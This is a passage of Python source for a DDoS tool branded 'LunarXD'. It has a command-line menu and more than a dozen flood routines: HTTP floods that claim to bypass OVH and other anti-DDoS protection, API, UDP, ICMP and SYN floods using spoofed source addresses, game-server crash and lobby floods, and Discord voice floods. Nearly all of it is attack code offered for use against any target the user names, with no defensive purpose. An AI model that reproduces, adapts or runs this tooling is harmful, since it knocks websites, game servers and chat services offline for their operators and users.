    global proxies
    add = "?" if "?" not in path else "&"
    base_header = GenReqHeader("get")
    tls_headers = (
        f"Accept-Encoding: gzip, deflate, br\r\n"
        f"Connection: keep-alive\r\n"
        f"Upgrade-Insecure-Requests: 1\r\n"
        f"Sec-Ch-Ua: \"Chromium\";v=\"{random.randint(90, 120)}\", \"Not;A=Brand\";v=\"8\"\r\n"
    )
    ciphers = ["TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256", "ECDHE-RSA-AES128-GCM-SHA256"]
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_3)
                ctx.set_ciphers(Choice(ciphers))
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(5000):
                header = base_header + tls_headers
                get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
                request = get_host + header
                sent = s.send(str.encode(request))
                if not sent:
                    break
            s.close()
        except:
            if s:
                s.close()

def udp_kill(event, proxy_type, target_ip, target_port):
    global proxies
    payloads = [
        generate_random_payload(1024),
        generate_random_payload(2048),
        generate_random_payload(4096),
        b"FUCKYOU" * 512,
    ]
    spoofed_sources = [spoof_source_ip() for _ in range(50)]
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
            proxy_ip, proxy_port = proxy.split(":")
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, proxy_ip, int(proxy_port))
            elif proxy_type == 5:
                s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
            elif proxy_type == 0:
                s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            s.settimeout(2)
            for _ in range(2000):
                payload = Choice(payloads)
                source_ip = Choice(spoofed_sources)
                s.sendto(payload, (target_ip, target_port))
                s.bind((source_ip, Intn(1024, 65535)))
                if random.random() < 0.1:
                    break
            s.close()
        except:
            if s:
                s.close()

def ovh(event, proxy_type):
    global proxies
    add = "?" if "?" not in path else "&"
    base_header = GenReqHeader("get")
    ovh_headers = (
        f"X-OVH-Protection: bypass\r\n"
        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
        f"Sec-Fetch-Site: cross-site\r\n"
        f"Sec-Fetch-Mode: navigate\r\n"
        f"Sec-Ch-Ua-Platform: \"Windows\"\r\n"
        f"Sec-Ch-Ua-Mobile: ?0\r\n"
    )
    user_agents = [getuseragent() for _ in range(25)]
    spoofed_ips = [spoof_source_ip() for _ in range(25)]
    session_id = binascii.hexlify(os.urandom(16)).decode()
    cookies = f"ovh_session={session_id}; ovh_lb={random.randint(1000, 9999)}"
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            initial_request = f"GET {path} HTTP/1.1\r\nHost: {target}\r\n{base_header}\r\nCookie: {cookies}\r\n\r\n"
            s.send(str.encode(initial_request))
            response = s.recv(4096).decode(errors='ignore')
            captcha_solution = solve_captcha(response)
            for _ in range(5000):
                ua = Choice(user_agents)
                ip = Choice(spoofed_ips)
                header = (
                    base_header.replace("User-Agent: ", f"User-Agent: {ua}\r\n") +
                    ovh_headers +
                    f"X-Forwarded-For: {ip}\r\n" +
                    f"Cookie: {cookies}\r\n"
                )
                if captcha_solution:
                    header += f"X-Captcha-Token: {captcha_solution['captcha_token']}\r\n"
                get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
                request = get_host + header
                sent = s.send(str.encode(request))
                if not sent:
                    break
                if random.random() < 0.03:
                    session_id = binascii.hexlify(os.urandom(16)).decode()
                    cookies = f"ovh_session={session_id}; ovh_lb={random.randint(1000, 9999)}"
            s.close()
        except:
            if s:
                s.close()

def dgb(event, proxy_type):
    global proxies
    add = "?" if "?" not in path else "&"
    base_header = GenReqHeader("get")
    dgb_headers = (
        f"X-DG-Challenge: {binascii.hexlify(os.urandom(10)).decode()}\r\n"
        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        f"Sec-Fetch-Site: none\r\n"
        f"Sec-Fetch-Mode: cors\r\n"
        f"Sec-Fetch-Dest: empty\r\n"
        f"Origin: https://{target}\r\n"
    )
    user_agents = [getuseragent() for _ in range(30)]
    spoofed_ips = [spoof_source_ip() for _ in range(30)]
    session_id = binascii.hexlify(os.urandom(16)).decode()
    cookies = f"dg_sid={session_id}; dg_auth={binascii.hexlify(os.urandom(12)).decode()}"
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_3)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            initial_request = f"GET {path} HTTP/1.1\r\nHost: {target}\r\n{base_header}\r\nCookie: {cookies}\r\n\r\n"
            s.send(str.encode(initial_request))
            response = s.recv(4096).decode(errors='ignore')
            captcha_solution = solve_captcha(response)
            for _ in range(5000):
                ua = Choice(user_agents)
                ip = Choice(spoofed_ips)
                header = (
                    base_header.replace("User-Agent: ", f"User-Agent: {ua}\r\n") +
                    dgb_headers +
                    f"X-Forwarded-For: {ip}\r\n" +
                    f"Cookie: {cookies}\r\n"
                )
                if captcha_solution:
                    header += f"X-DG-Captcha: {captcha_solution['captcha_token']}\r\n"
                get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
                request = get_host + header
                sent = s.send(str.encode(request))
                if not sent:
                    break
                if random.random() < 0.02:
                    session_id = binascii.hexlify(os.urandom(16)).decode()
                    cookies = f"dg_sid={session_id}; dg_auth={binascii.hexlify(os.urandom(12)).decode()}"
            s.close()
        except:
            if s:
                s.close()

def http_storm(event, proxy_type):
    global proxies
    add = "?" if "?" not in path else "&"
    base_header = GenReqHeader("get")
    storm_headers = (
        f"X-Request-ID: {binascii.hexlify(os.urandom(8)).decode()}\r\n"
        f"Accept-Encoding: gzip, deflate, br, zstd\r\n"
        f"Sec-Fetch-Site: cross-site\r\n"
        f"Sec-Fetch-Mode: no-cors\r\n"
        f"Priority: u=0, i\r\n"
    )
    user_agents = [getuseragent() for _ in range(50)]
    spoofed_ips = [spoof_source_ip() for _ in range(50)]
    session_id = binascii.hexlify(os.urandom(16)).decode()
    cookies = f"storm_session={session_id}; lb_id={random.randint(1000, 9999)}"
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_3)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(5000):
                ua = Choice(user_agents)
                ip = Choice(spoofed_ips)
                header = (
                    base_header.replace("User-Agent: ", f"User-Agent: {ua}\r\n") +
                    storm_headers +
                    f"X-Forwarded-For: {ip}\r\n" +
                    f"Cookie: {cookies}\r\n"
                )
                methods = ["GET", "HEAD", "OPTIONS"]
                method = Choice(methods)
                full_path = path + add + randomurl()
                request = f"{method} {full_path} HTTP/1.1\r\nHost: {target}\r\n{header}\r\n"
                sent = s.send(str.encode(request))
                if not sent:
                    break
                if random.random() < 0.05:
                    session_id = binascii.hexlify(os.urandom(16)).decode()
                    cookies = f"storm_session={session_id}; lb_id={random.randint(1000, 9999)}"
            s.close()
        except:
            if s:
                s.close()

def api_killer(event, proxy_type):
    global proxies
    add = "?" if "?" not in path else "&"
    base_header = GenReqHeader("post")
    api_headers = (
        f"Content-Type: application/json\r\n"
        f"X-API-Token: {binascii.hexlify(os.urandom(12)).decode()}\r\n"
        f"Accept: application/json\r\n"
        f"Origin: https://{target}\r\n"
    )
    user_agents = [getuseragent() for _ in range(30)]
    spoofed_ips = [spoof_source_ip() for _ in range(30)]
    payloads = [
        '{"query":"mutation { flood(input: { id: \\"' + binascii.hexlify(os.urandom(8)).decode() + '\\" })}"}',
        '{"data":"' + base64.b64encode(os.urandom(512)).decode() + '"}',
        '{"action":"stress","token":"' + binascii.hexlify(os.urandom(16)).decode() + '"}',
    ]
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_3)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(5000):
                ua = Choice(user_agents)
                ip = Choice(spoofed_ips)
                payload = Choice(payloads)
                header = (
                    base_header.replace("User-Agent: ", f"User-Agent: {ua}\r\n") +
                    api_headers +
                    f"X-Forwarded-For: {ip}\r\n" +
                    f"Content-Length: {len(payload)}\r\n"
                )
                full_path = path + add + randomurl()
                request = f"POST {full_path} HTTP/1.1\r\nHost: {target}\r\n{header}\r\n{payload}\r\n"
                sent = s.send(str.encode(request))
                if not sent:
                    break
                time.sleep(random.uniform(0.01, 0.05))
            s.close()
        except:
            if s:
                s.close()

def icmp_blast(event, proxy_type, target_ip, target_port):
    global proxies
    payloads = [
        generate_random_payload(64),
        generate_random_payload(128),
        generate_random_payload(256),
    ]
    spoofed_sources = [spoof_source_ip() for _ in range(100)]
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = socks.socksocket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            proxy_ip, proxy_port = proxy.split(":")
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, proxy_ip, int(proxy_port))
            elif proxy_type == 5:
                s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
            elif proxy_type == 0:
                s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.settimeout(2)
            for _ in range(2000):
                payload = Choice(payloads)
                source_ip = Choice(spoofed_sources)
                icmp_packet = (
                    b"\x08\x00" +
                    b"\x00\x00" +
                    os.urandom(4) +
                    payload
                )
                s.sendto(icmp_packet, (target_ip, 0))
                s.bind((source_ip, Intn(1024, 65535)))
                if random.random() < 0.1:
                    break
            s.close()
        except:
            if s:
                s.close()

def syn_strike(event, proxy_type, target_ip, target_port):
    global proxies
    spoofed_sources = [spoof_source_ip() for _ in range(100)]
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            for _ in range(2000):
                source_ip = Choice(spoofed_sources)
                s.bind((source_ip, Intn(1024, 65535)))
                s.connect((target_ip, target_port))
                s.send(b"\x00" * 20)
                if random.random() < 0.1:
                    break
            s.close()
        except:
            if s:
                s.close()

def game_crash(event, proxy_type, target_ip, target_port):
    global proxies
    payloads = [
        b"\xFF\xFF\xFF\xFF" + os.urandom(32),
        b"\x00\x00" + os.urandom(64),
        b"\xFE\xFD" + os.urandom(16),
    ]
    spoofed_sources = [spoof_source_ip() for _ in range(50)]
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
            proxy_ip, proxy_port = proxy.split(":")
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, proxy_ip, int(proxy_port))
            elif proxy_type == 5:
                s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
            elif proxy_type == 0:
                s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.settimeout(2)
            for _ in range(2000):
                payload = Choice(payloads)
                source_ip = Choice(spoofed_sources)
                s.sendto(payload, (target_ip, target_port))
                s.bind((source_ip, Intn(1024, 65535)))
                if random.random() < 0.1:
                    break
            s.close()
        except:
            if s:
                s.close()

def lobby_flood(event, proxy_type, target_ip, target_port):
    global proxies
    payloads = [
        b"\x01\x00" + os.urandom(16),
        b"\x02\x00" + os.urandom(32),
        b"\x00\x01" + os.urandom(64),
    ]
    spoofed_sources = [spoof_source_ip() for _ in range(50)]
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((target_ip, target_port))
            for _ in range(2000):
                payload = Choice(payloads)
                source_ip = Choice(spoofed_sources)
                s.bind((source_ip, Intn(1024, 65535)))
                s.send(payload)
                if random.random() < 0.05:
                    s.close()
                    s = setup_socket(proxy_type, proxy)
                    s.connect((target_ip, target_port))
            s.close()
        except:
            if s:
                s.close()

def discord(event, proxy_type, target_ip, target_port):
    global proxies
    payloads = [
        b"\x00\x00" + os.urandom(128),
        b"\xFF\xFF" + os.urandom(64),
        b"\x01\x01" + os.urandom(256),
    ]
    spoofed_sources = [spoof_source_ip() for _ in range(50)]
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((target_ip, target_port))
            for _ in range(2000):
                payload = Choice(payloads)
                source_ip = Choice(spoofed_sources)
                s.bind((source_ip, Intn(1024, 65535)))
                s.send(payload)
                if random.random() < 0.1:
                    break
            s.close()
        except:
            if s:
                s.close()

def spoof_source_ip():
    return f"{Intn(1, 255)}.{Intn(0, 255)}.{Intn(0, 255)}.{Intn(0, 255)}"

def generate_random_payload(size):
    return os.urandom(size)

def parse_discord_link(link):
    try:
        if "discord" not in link:
            return None, None
        return "voice.discord.com", 443
    except:
        return None, None

def Launch(method, url, threads, duration, proxy_type, port=None):
    global target, path, protocol, proxies
    event = threading.Event()
    clearcs()

    if not load_proxies():
        return False

    print(f"""{Colorate.Horizontal(Colors.cyan_to_blue, "             ╦  ╦ ╦╔╗╔╔═╗╦═╗")}
{Colorate.Horizontal(Colors.cyan_to_blue, "             ║  ║ ║║║║╠═╣╠╦╝")}
{Colorate.Horizontal(Colors.cyan_to_blue, "             ╩═╝╚═╝╝╚╝╩ ╩╩╚═𝔁𝓭")}
{white}  ⏾⋆.˚ 𝓐𝓽𝓽𝓪𝓬𝓴 𝔀𝓪𝓼 𝓼𝓮𝓷𝓽 𝓼𝓾𝓬𝓬𝓮𝓼𝓼𝓯𝓾𝓵𝓵𝔂! ⏾⋆.˚
{Colorate.Horizontal(Colors.cyan_to_blue, "┌───────────────────────────────────────────┐")}
{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴀᴛᴛᴀᴄᴋ ꜱᴜᴍᴍᴀʀʏ
{Colorate.Horizontal(Colors.cyan_to_blue, "├────────────────────────────────────────────")}
{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴛᴀʀɢᴇᴛ {Colorate.Horizontal(Colors.cyan_to_blue, "🎯  ➤")}  {(url if method in ['cc', 'post', 'head', 'uambypass', 'browser', 'home', 'cfbypass', 'tls', 'ovh', 'dgb', 'http-storm', 'api-killer'] else target).ljust(30)}
{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴍᴏᴅᴇ {Colorate.Horizontal(Colors.cyan_to_blue, "⚙️     ➤")}  {method.ljust(30)}
{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴛɪᴍᴇ {Colorate.Horizontal(Colors.cyan_to_blue, "⌛    ➤")}  {str(duration).ljust(30)}
{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴛʜʀᴇᴀᴅ {Colorate.Horizontal(Colors.cyan_to_blue, "⚔   ➤")}  {str(threads).ljust(30)}
{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴘʀᴏxʏ ᴛ {Colorate.Horizontal(Colors.cyan_to_blue, "⦻  ➤")}  {str(proxy_type).ljust(30)}
{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴘʀᴏxʏ ꜰ {Colorate.Horizontal(Colors.cyan_to_blue, "☣  ➤")}  {out_file.ljust(30)}
{Colorate.Horizontal(Colors.cyan_to_blue, "├────────────────────────────────────────────")}
{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ɢɪᴛʜᴜʙ     {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}  https://github.com/Sakuzuna/
{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴄʜᴇᴄᴋʜᴏꜱᴛ  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}  https://check-host.net/check-http?host={(url if method in ['cc', 'post', 'head', 'uambypass', 'browser', 'home', 'cfbypass', 'tls', 'ovh', 'dgb', 'http-storm', 'api-killer'] else target)}
{Colorate.Horizontal(Colors.cyan_to_blue, "└───────────────────────────────────────────┘")}""")

    if method in ["udpflood", "tcpflood", "dns", "udp-kill", "icmp-blast", "syn-strike", "game-crash", "lobby-flood"]:
        if not ParseUrl(url, is_layer4=True):
            return False
        target_ip = target
        target_port = port if port else 80
    elif method == "discord":
        target_ip, target_port = parse_discord_link(url)
        if not target_ip:
            print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid Discord link or unable to resolve voice server."))
            return False
        target_port = port if port else target_port
    else:
        if not ParseUrl(url):
            return False
        target_ip = target
        target_port = port if port else port

    build_threads(method, threads, event, proxy_type, target_ip, target_port)
    event.set()
    time.sleep(duration)
    event.clear()
    print(Colorate.Horizontal(Colors.cyan_to_blue, f"> Attack {method.upper()} finished."))
    return True

def main():
    global proxies, thread_num, out_file
    proxies = []
    out_file = "proxies.txt"
    thread_num = 1500

    clearcs()
    bannerm()

    while True:
        command = input(Colorate.Horizontal(Colors.cyan_to_blue, """┌─[ʟᴜɴᴀʀxᴅ]─[~]
└──╼ ➤ """)).strip().lower()
        
        if command:
            if command in ["methods", "help", "menu"]:
                try:
                    play_ascii_video("banner.mp4", duration=2.5)
                    clearcs()
                except:
                    clearcs()
                    runbanner()
            else:
                try:
                    clearcs()
                    play_ascii_video("banner.mp4", duration=2.5)
                except:
                    runbanner()

        if command == "help":
            print(f"""{Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("COMMANDS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}

{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}exit              {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Exit the tool
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}HELP              {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Show this help message
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}methods           {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   List available attack methods
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}menu              {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Return to the main menu

{Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("L4 METHODS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}

{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}  .l4 <method> <ip>[:port] <threads> <duration> [port]        {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Run LAYER4 attack 

{Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("L7 METHODS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}
   
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}  .l7 <method> <url> <threads> <duration> [port]              {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Run LAYER7 attack         

{Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("GAME METHODS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}

{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}  .game <method> <ip>[:port] <threads> <duration> [port]      {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Run GAME attack 
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}  .discord <link> <threads> <duration> [port]                 {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Run DISCORD tcp flood
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}  .connect                                                    {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Minecraft bot flood with GUI interface [Just input .connect]
""")

        elif command == ".connect":
            clearcs()
            subprocess.run(['python3', 'minecraft_ddos.py'])
        elif command == "methods":
            print(f"""{Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("L4 METHODS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}

{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}udpflood    {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   High-intensity UDP flood with variable packet size and spoofed source to saturate bandwidth.                           {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}tcpflood    {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Aggressive TCP flood with SYN and data packets to exhaust connection limits and resources.                             {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}dns         {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Sophisticated DNS flood with randomized queries to overwhelm DNS servers.                                              {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}udp-kill    {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Extreme UDP flood with large payloads to disrupt network stability.                                                    {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}icmp-blast  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   ICMP flood with spoofed sources to overload network interfaces.                                                        {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}syn-strike  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   SYN flood with randomized source IPs to exhaust server connection tables.                                              {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}

{Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("L7 METHODS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}

{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}cc          {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   HTTP GET flood with randomized URLs to bypass caching mechanisms.                                                      {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}post        {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   HTTP POST flood with large payloads to consume server processing power.                                                {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}head        {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   HTTP HEAD flood to overload server response handling.                                                                  {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}uambypass   {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   HTTP flood with randomized user-agents and IPs to mimic legitimate traffic.                                            {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}browser     {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Simulates browser-like HTTP requests with session persistence to stress application layers.                            {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}home        {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Targets home pages with spoofed IPs to overwhelm front-end servers.                                                    {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}cfbypass    {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Attempts to bypass Cloudflare protections with dynamic headers and cookies.                                            {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}tls         {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   TLS handshake flood with modern ciphers to exhaust SSL/TLS resources.                                                  {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}ovh         {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Targets OVH-hosted servers with customized HTTP requests to bypass protections.                                        {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}dgb         {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Floods with anti-DDoS bypass headers to target specific protections.                                                   {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}http-storm  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Multi-method HTTP flood (GET/HEAD/OPTIONS) to overwhelm web servers.                                                   {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}api-killer  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Targets API endpoints with JSON payloads to disrupt backend services.                                                  {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}

{Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("GAME METHODS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}

{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}game-crash  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Sends malformed packets to crash game servers.                                                                         {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}lobby-flood {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Floods game lobbies with connection requests to disrupt matchmaking.                                                  {Colorate.Horizontal(Colors.cyan_to_blue, " PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}discord     {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Targets Discord voice servers with TCP floods to disrupt communications.                                               {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}connect     {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Sends bot on a minecraft server                                                                                        {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
""")

        elif command.startswith(".l4"):
            try:
                parts = command.split()
                if len(parts) < 5:
                    clearcs()
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Usage: .l4 <method> <ip>[:port] <threads> <duration> [port]"))
                    continue
                method = parts[1].lower()
                target = parts[2]
                threads = int(parts[3])
                duration = int(parts[4])
                port = int(parts[5]) if len(parts) > 5 else None
